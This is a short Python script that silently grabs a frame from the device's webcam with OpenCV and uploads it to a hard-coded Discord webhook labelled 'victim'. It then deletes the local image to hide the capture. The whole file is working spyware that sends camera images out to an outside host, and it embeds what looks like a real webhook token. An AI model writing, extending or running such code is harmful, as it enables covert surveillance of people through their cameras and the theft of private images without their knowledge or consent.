import cv2
import requests
import os

DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8'

def capture_image():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Error: Could not open camera.")
        return None

    ret, frame = cap.read()
    if not ret:
        print("Error: Could not capture image.")
        cap.release()
        return None

    cap.release()
    return frame

def send_to_discord(image_path, message):
    with open(image_path, 'rb') as f:
        files = {'file': f}
        data = {'content': message}
        response = requests.post(DISCORD_WEBHOOK_URL, files=files, data=data)

    if response.status_code == 204:
        print("Image sent to Discord successfully.")
    else:
        print(f"Failed to send image to Discord. Status code: {response.status_code}")

def main():
    image = capture_image()
    if image is None:
        return

    image_path = 'captured_image.jpg'
    cv2.imwrite(image_path, image)

    message = "victim"
    send_to_discord(image_path, message)

    os.remove(image_path)
    print("Image file deleted from the device.")

if __name__ == "__main__":
    main()
